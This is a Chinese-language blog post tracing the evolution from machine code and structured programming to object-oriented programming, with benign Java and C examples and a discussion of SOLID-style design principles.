    <content><![CDATA[<h1 id="面向对象的演化过程和解决问题"><a href="#面向对象的演化过程和解决问题" class="headerlink" title="面向对象的演化过程和解决问题"></a>面向对象的演化过程和解决问题</h1><blockquote>
<p>前言：</p>
</blockquote>
<p>相信大家对面向对象这个概念已经很熟悉了，如果你是使用Java入门编程的，一定会被大量灌输：<code>类，继承，多态</code>的概念，但我们真的理解它们吗？一切就好像自然而然，写代码不就应该是这样吗？但事实上这些概念，只是我们脑海中的一个毫无意义的符号，当我们写一个类时，我们只是按照被教导的方式编写。好比现在最多的Web开发，业务是用户的增删改查，我们想到用户会有：name,age,gender属性。于是我们创建一个实体：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>
  <span class="token class-name">String</span> name<span class="token punctuation">;</span>
  <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>
  <span class="token class-name">Integer</span> gender<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后按部就班的写出Mapper(或Dao)层，Service层，Controller层，这就是MVC结构，它是如此的好用，让我们编写简单业务时十分顺手。但是当业务逐渐复杂时，我们在Service，Controller层中添加了大量的外部依赖，各种依赖注入，大量重复的代码堆砌在各个角落，一个变量被各个函数引用修改，当出现问题时，我们不得不到各个函数中查看，到底哪里出了问题，面向对象中的概念已抛到脑后。而且很糟的一点是，好像除了Web开发，想写出其他程序，便不知道从何写起了。我们的脑袋还被框架禁锢住了。</p>
<p>渐渐地，我们知道了设计模式这玩意儿，听说有了它，便能化腐朽为神奇，不过打开书发现，基本上都是从面向对象讲起，为什么还是它？因为它是一切的基础，面向对象就是为了解决以往混乱编程所演化的思想。所以本文会列出面向对象的演化过程，各个阶段遇到的问题，已经是如何慢慢改进的。</p>
<p>最早我使用Python写爬虫程序，那里只有一个py文件，没有&lt;类，继承，多态&gt;。只有自上而下的变量，条件，循环，网页请求，正则匹配，然后输出到控制台。但问题也能被很好的解决了。 </p>
<h2 id="机器语言"><a href="#机器语言" class="headerlink" title="机器语言"></a>机器语言</h2><p>计算机只可以解释用二进制数编写的机器语言。并且计算机不对机器语言检查，而是飞快的执行。二十世纪四十年代，还没有现在这么多通俗易懂的编程语言。程序员必须用机器语言编写，我们看看个简单的例子，这里只是简单的算术计算。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A10010
8B160210
01D0
A10410<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这玩意儿没人愿意看和写吧，致敬前辈们。😭</p>
<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p>为了改善机器语言的编码方式，汇编语言出现了，它将无含义的机器语言用人类易懂的符号表达，我们再改写上面的代码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MOV AX, X
MOV DX, Y
ADD AX,DX
MOV Z, AX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这玩意儿大概猜一下，能看出MOV是信息传递，ADD是加法运算吧，通过这种方式，编码方式变得轻松了许多，但逐个指定计算机的执行命令也很麻烦。</p>
<h2 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h2><p>随后的高级语言采用人类更容易理解的方式进行,改写上面的代码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">Z</span><span class="token operator">=</span>X+Y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以看到程序的形式和数学计算公式非常相似，即使没有编程经验的人也能理解。</p>
<h2 id="结构化编程"><a href="#结构化编程" class="headerlink" title="结构化编程"></a>结构化编程</h2><p>随着高级语言的出现，编程的效率和质量都在不断上升，再加上计算机的飞速发展和普及，人们对提高编程效率的需求从未止步，也就提出了各种新的思想和编程语言。</p>
<p>其中最受关注的是：<strong>结构化编程</strong>，核心思想是：<code>为了编写正确运转的程序，采用简单易懂的结果是非常重要的。</code></p>
<p>而具体方式：</p>
<blockquote>
<p>废除GOTO语句</p>
</blockquote>
<p>在Java中我们都没听过GOTO语句，不过在C语音中还有，这是因为当年内存容量，硬件性能都很差，推崇哪怕减少一字节，或者一步也好，代码顺序执行混乱，导致维护性很差。</p>
<blockquote>
<p>使用循序，选择，重复来表达逻辑</p>
</blockquote>
<p>循序就是按顺序执行代码</p>
<p>选择就是条件判断，如if,case</p>
<p>重复就是重复执行某个命令，如for，while</p>
<p>这三种结构被称为<strong>三种基本结构</strong>，我们也可以看到现在的编程语言都遵循这样的结构。</p>
<h3 id="提高子程序的独立性，强化维护性"><a href="#提高子程序的独立性，强化维护性" class="headerlink" title="提高子程序的独立性，强化维护性"></a>提高子程序的独立性，强化维护性</h3><p>我们都知道，如果一段代码经常重复出现，我们可以将它抽离为一个函数，进行统一调用，这样在未来修改时，也很方便。</p>
<p>而在当时为了强化程序的可维护性，还有另一种方法，就是提高子程序(函数)的独立性。</p>
<blockquote>
<p> 那该如何提高函数的独立性呢？</p>
</blockquote>
<p>减少主程序与子程序共享信息，而多个子程序中共享的信息就是全局变量。所以就要尽可能减少全局变量。</p>
<p>为什么这么做呢？你想想这个变量谁的都能访问修改，出了问题我找谁啊！现在有了IDE开发工具，我们还算能方便点儿，但在以前的时候，编译先等着，获取执行结果再等着，再去成百上千个代码中查找问题就更费时间了。</p>
<p>为了解决这样的问题，人们设计了两种结构：局部变量，按值传递。</p>
<ul>
<li><p>局部变量: 在函数中使用的变量，函数执行开始创建，结束时消失。</p>
</li>
<li><p>按值传递: 在传参时，不直接使用调用端引用的变量，而是复制值进行传递，这样即使函数内部进行了修改，也不会影响外界的变量。</p>
</li>
</ul>
<p>这两种结构能将全局变量的使用控制到最小范围，减少子程序共享的信息，<strong>以此提高函数的独立性</strong>。</p>
<hr>
<p>在结构化语言中最有名的就是C语言，它完全支持结构化编程的功能，并且能高效的操作内存，不过另一个特征就是：函数库，编程需要的功能不仅是语言规范提供，还有函数库，比如输出字符串printf。这样就能不用修改编译器，也能增加新的功能</p>
<h3 id="进化方向演化为重视可维护性和可重用性"><a href="#进化方向演化为重视可维护性和可重用性" class="headerlink" title="进化方向演化为重视可维护性和可重用性"></a>进化方向演化为重视可维护性和可重用性</h3><p>我们来一总结编程语言的进化历史吧</p>
<p>分为两条线：</p>
<ul>
<li>从机器语言-&gt;汇编语言-&gt;高级语言，编程语言发展的<strong>更符合人类语言的方式</strong>来描述计算机执行操作，代表作：FORTRAN，COBOL。但遗憾的是仍无法满足需求</li>
<li>接下来的结构化语言就需要改变方向，即<strong>提高可维护性</strong>，无GOTO编程和提高子程序独立性都是为了程序便于理解和修改。</li>
</ul>
<p>程序的寿命也越来越长，老的代码要被一直维护，那能看的懂，并能进行修改，就很重要了。</p>
<hr>
<h3 id="没有解决的问题"><a href="#没有解决的问题" class="headerlink" title="没有解决的问题"></a>没有解决的问题</h3><ol>
<li>全局变量问题</li>
<li>可重用性差问题</li>
</ol>
<p>全局变量问题是指：虽然引入了局部变量和按值传递，但当我们要将计算结构保存下来时，局部变量在函数结束时消失，所以要将结果保存到函数外部，也就又变成全局变量了。</p>
<p>可重用性差是指：虽然使用函数库来重用，但随着需求越来越大，仅靠函数是不够的。</p>
<h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><h3 id="OOP的三种结构"><a href="#OOP的三种结构" class="headerlink" title="OOP的三种结构"></a>OOP的三种结构</h3><p>这三种结构为: 类(封装)，多态，继承。也被称为OOP的三要素。</p>
<p>而在前面的结构化语言中我们没有解决的问题，就可以被这三种结构解决</p>
<ul>
<li>OOP具有不使用全局变量的结构</li>
<li>OOP具有除公用子程序之外的可重用结构</li>
</ul>
<p>需要注意虽然现在大部分语言都属于OOP，但根据编程语言的设计不同，语法差异也会不同，比如：Java和Ruby，Java中没有全局变量的概念，而Ruby中仍有保留，而且两个语言的差异也很大。</p>
<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类的功能总结为：</p>
<ol>
<li><strong>汇总</strong>子程序和变量</li>
<li><strong>隐藏</strong>类内部的子程序和变量</li>
<li>一个类可以<strong>创建多个实例</strong></li>
</ol>
<blockquote>
<p>汇总</p>
</blockquote>
<p>我们举个文件访问的例子，代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fileName<span class="token punctuation">;</span>
<span class="token keyword">char</span> readChar<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">openFile</span><span class="token punctuation">(</span>String pathName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>省略<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">closeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>省略<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">char</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>省略<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序由子程序和全局变量构成，而如果使用面向对象的方式进行管理就变成：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TextFileReader</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> fileName<span class="token punctuation">;</span>
	<span class="token keyword">char</span> readChar<span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token keyword">open</span><span class="token punctuation">(</span><span class="token class-name">String</span> pathName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>省略<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>省略<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>省略<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到这里将子程序和全局变量都汇总到一个类里了，好像没什么区别，但是汇总本身就是有意义的，就好比将散乱的东西分门别类，这样当再去寻找时，就有个范围。而且通过类的汇总，我们可以将子函数的名称变得更简洁，并且避免了命名冲突的问题。当别的类也有：open, close, read方法时，双方并不会影响。</p>
<img src="../../typora-user-images/2831703308620_.pic.jpg" alt="2831703308620_.pic" style="zoom:50%;" />

<blockquote>
<p>隐藏</p>
</blockquote>
<p>比如上面的代码，我们只希望类内部的方法能访问类中实例变量，外部不让动，这样就能解决全局变量的问题了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TextFileReader</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> fileName<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token keyword">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">someMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过访问修饰符来控制变量与子函数的访问权限，可以选择公开或者隐藏。</p>
<blockquote>
<p>创建多个实例</p>
</blockquote>
<p>通过C语言也可以实现上面的汇总和隐藏功能，而创建多个实例则很难实现这种结构。比如上面的文件访问例子，如果只访问一个文件没有问题，那如果访问多个文件，并比较区别该怎么操作？ </p>
<p>这里我们不需要再改成数组，来轮询访问，通过创建多个实例就可以解决这种问题。不过按照我们以前访问函数和变量的方式，当有多个实例时，该怎么区分哪个实例变量才是要处理的对象，用OOP的方式就得改为：<code>实例名称 . 方法名(参数)</code>，代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TextFileReader</span> reader1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextFileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TextFileReader</span> reader2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextFileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

reader1<span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token string">"a.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
reader2<span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token string">"b.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">char</span> ch1 <span class="token operator">=</span> reader1<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> ch2 <span class="token operator">=</span> reader2<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

reader1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
reader2<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们创建了两个实例，并分别处理不同的文件，而每个方法都会访问当前实例内的变量。这样在类定义的一端，就不用担心多个实例同时运行的情况了。</p>
<blockquote>
<p>实例变量是限定访问范围的全局变量</p>
</blockquote>
<p>实例变量的特性：</p>
<ol>
<li>能被隐藏，其他类的方法无法访问到</li>
<li>实例创建后一直保存到内存中，直到不再需要</li>
</ol>
<p>这样就既解决了全局变量都能访问，又解决了局部变量信息无法妥善保存的问题</p>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态是创建公用主程序的结构，与公用子程序相对应，公用子程序将被调用端的逻辑汇总为一个逻辑，而多态则相反，统一了调用端的逻辑</p>
<p>说的简单点儿：我创建了一个公共函数(公共子程序)，不管是谁调用这个函数，函数内不变。而多态是，不管被调用的东西内部怎么变，我都不用修改调用的代码。</p>
<p>我们用代码来说明一下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TextReader</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">void</span> <span class="token keyword">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们创建一个公共的接口，或者说是规范，当后面读取不同东西时，统一走这里的逻辑就行</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">NetworkReader</span> <span class="token keyword">extends</span> <span class="token class-name">TextReader</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 网络文件读取</span>
    <span class="token keyword">void</span> <span class="token keyword">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">TextFileReader</span> <span class="token keyword">extends</span> <span class="token class-name">TextReader</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 网络文件读取</span>
    <span class="token keyword">void</span> <span class="token keyword">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们定义了网络文件读取和文件文件读取，当用户最初是使用网络文件读取时：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TextReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NetworkReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
reader<span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
reader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>当想再换成文本文件读取时：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TextReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextFileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 只有这里修改了，其他地方完全一样！！！</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样当需求变化时，只需要简单的调整，就能实现另外一套完全不同的操作</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承将类的共同部分汇总到其他类中的结构。</p>
<img src="../../typora-user-images/2841703308620_.pic.jpg" alt="2831703308620_.pic" style="zoom:50%;" />

<p>需要注意声明继承也就声明使用多态，因此在声明继承的子类中，为了统一方法调用，继承的方法参数和返回值类型必须与超类一致。</p>
<p>这里可以引申出：<strong>里氏替换原则:派生类（子类）对象可以在程序中代替其基类（超类）对象。</strong></p>
<p>通过这一原则，才可以实现对扩展开放，多修改关闭，当子类对父类方法进行扩展时，保证程序的兼容性，降低代码出错的可能。</p>
<hr>
<p>上面我们介绍了OOP的三大要素：类，多态，继承。不过例如Java，Ruby，Python等比较新的编程语言提供了更先进的结构，典型的有：包，异常，垃圾回收。设计这种结构就是为了促进重用，减少错误等。我们简单介绍一下</p>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>说到了具有汇总功能的类结构，而包是进一步对类的汇总的结构。</p>
<p><img src="../../typora-user-images/2851703308621_.pic.jpg" alt="2851703308621_.pic"></p>
<p>不同于类，包不能定义方法和变量，但通过这种结构，也就是类似文件系统中的目录，我们可以更加轻松的组织管理。我们假设如果没有包，所有的类文件都放到根目录，一方面是命名冲突，一方面是要在大量的类中，找到具体那个，也很麻烦。</p>
<h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>在我们代码运行时，总会有各种问题出现，数组越界，空指针等等。</p>
<p>在没有异常时，我们可以通过返回码来表示系统运行的不同状态，比如返回200表示正常，返回-200表示数组越界，返回-300表示空指针，但这有一个问题，调用端需要根据不同的状态处理不同的情况，大量的if-else，异常处理混杂在代码中间。而且当调用端无法处理某种情况时，就必须将异常值再返回到上层，同样的异常处理在上层再写一遍。</p>
<p>问题: </p>
<ol>
<li>必须在应用程序中执行所有的错误码判断</li>
<li>错误码的判断逻辑在多个子程序中连锁</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Integer</span> result <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 对应处理</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 对应处理</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 对应处理</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 对应处理</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 正常逻辑</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>异常就是用于解决以上问题的结构。</p>
<p>异常结构会在方法中声明可能返回的特殊错误，这种特殊错误的返回方式就是异常，其语法不同于子程序的返回值。</p>
<p>在声明异常的方法的调用端，如果编写异常处理逻辑不正确，程序会发生错误，这就解决了第一个问题。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
   		<span class="token class-name">Integer</span> result <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 正常逻辑</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">NullError</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 执行</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">OutOfIndexError</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 执行</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有时在发生错误时不执行特殊处理，而是将错误传递给上位方法，这种情况只需要在方法中声明异常，而不必编写错误处理，就解决了第二个问题。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NullError</span><span class="token punctuation">,</span><span class="token class-name">OutOfIndexError</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 正常逻辑</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>需要注意Java这种静态类型语言会发生编译错误提醒，而Ruby这种动态语言则是在运行时错误提醒。</p>
</blockquote>
<h3 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h3><p>在说到创建多个实例时，只谈到了如何创建，但没有说如何删除，每当创建一个实例，就会为之分配内存，如果不能及时清理就会导致OOM(内存溢出)</p>
<p>在C和C++等之前的语言，需要显示的删除不需要的内存区域，但是就怕误删操作，或者忘了删了，需要一种机制能自动化管理，</p>
<p>在Java，C#等很多OOP中采用由系统自动进行删除实例的处理结构，也就是垃圾回收。这里有很多策略，比如引用计数法，标记清除法，标记整理法，推荐去看：深入理解Java虚拟机</p>
<h3 id="OOP与设计模式"><a href="#OOP与设计模式" class="headerlink" title="OOP与设计模式"></a>OOP与设计模式</h3><img src="../../typora-user-images/image-20231223132033799.png" alt="image-20231223132033799" style="zoom:50%;" />

<p>从历史上来说，先利用OOP创建可重用架构群，然后提取可重用构建群中的设计思想，形成设计模式，最后再利用设计模式，进一步创建可重用架构群。</p>
<h2 id="设计模式原则"><a href="#设计模式原则" class="headerlink" title="设计模式原则"></a>设计模式原则</h2><p>原则是一种抽象的概念，最初接触时很难深入理解，所以往往大家会着重于学习具体的设计模式，看代码是如何组织的。但当多观察几种设计模式后，就会发现一些通用点和策略</p>
<ul>
<li>对修改关闭对扩展开放。 开放闭合原则</li>
<li>高层模块不应该依赖于底层模块，两者都应该依赖抽象。 依赖反转原则</li>
<li>尽量使用组合和聚合关系，而不是继承关系。 合成复用原则</li>
</ul>
<p>等等，而这些就是设计模式原则，我们这里侧重于从OOP的发展历程角度来看待这些设计模式原则，看思想上是否是一致的。</p>
<h3 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h3><p><strong>定义</strong>：就一个类而言，应该仅有一个引起它变化的原因</p>
<p>我们之前提到OOP结构解决的一个问题就是可重用性结构。</p>
<p>而OOP提供的类结构在设计时，就是为了将不同职责的变量和函数进行划分，这样在进行维护时，只需要找到特定的类即可。如果一个类承担的职责过多，这些职责就会耦合，当职责发证变化时，其他职责也会发生影响，这就导致的设计的脆弱性。</p>
<p>就好像赤壁之战中，铁索连船，一个船着火了，其他的船也被影响。</p>
<h3 id="开放-封闭原则"><a href="#开放-封闭原则" class="headerlink" title="开放-封闭原则"></a>开放-封闭原则</h3><p><strong>定义:</strong> 软件实体(类，模块，函数等)应该可以扩展，但是不可修改。</p>
<p>有一句经典名言：拥抱变化。随着业务需求的变化，我们不得不对代码进行调整，但如果直接上手修改原有代码，在没有完整测试的情况下，很容易引入Bug。</p>
<p>而OOP提供的多态，继承结构就是为了解决这一问题，通过实现接口类或继承重写某些方法。这样在不修改原有功能的前提下，扩展新的功能。而通过多态，让客户端察觉不到发生的变化。</p>
<h3 id="依赖倒转原则"><a href="#依赖倒转原则" class="headerlink" title="依赖倒转原则"></a>依赖倒转原则</h3><p><strong>定义：</strong></p>
<ol>
<li>高层模块不应该依赖底层模块，二者都应该依赖抽象</li>
<li>抽象不应该依赖细节，细节应该依赖抽象</li>
</ol>
<p>我们观察一下SpringBoot在写MVC结构时，Service层是有一个接口层和实现层，Mapper层是有一个接口层和实现层。为什么需要这层接口呢？</p>
<p>这里一方面的原因是AOP所需的动态代理，而另一方面是SpringBoot这样设计是基于依赖反转原则的，当Controller层调用Service层时，指向的是Service接口，但具体的实现是通过ServiceImpl来做。这样双方都不需要知道具体的实现，Service层调用Mapper层也是同理的。假如我们原先是使用Mysql数据库，现在使用Oracle数据库，那我们只需要新增一个MapperImpleByOracle实现类即可。通过Spring容器的依赖注入，将代码修改范围降到最低。</p>
<p><img src="../../typora-user-images/image-20231223140232110.png" alt="image-20231223140232110"></p>
<h3 id="里氏替换原则"><a href="#里氏替换原则" class="headerlink" title="里氏替换原则"></a>里氏替换原则</h3><p><strong>定义：</strong>子类型必须能替换他们的父类型</p>
<p>只有当子类可以替换掉父类，软件单位的功能不受到影响时，父类才能真正被复用，而子类也能在父类的基础上增加新的行为，而这一点才使得开放-封闭原则称为可能。</p>
<p>而里氏替换原则是在OOP多态的基础上提出的，是对多态的一种规范。</p>
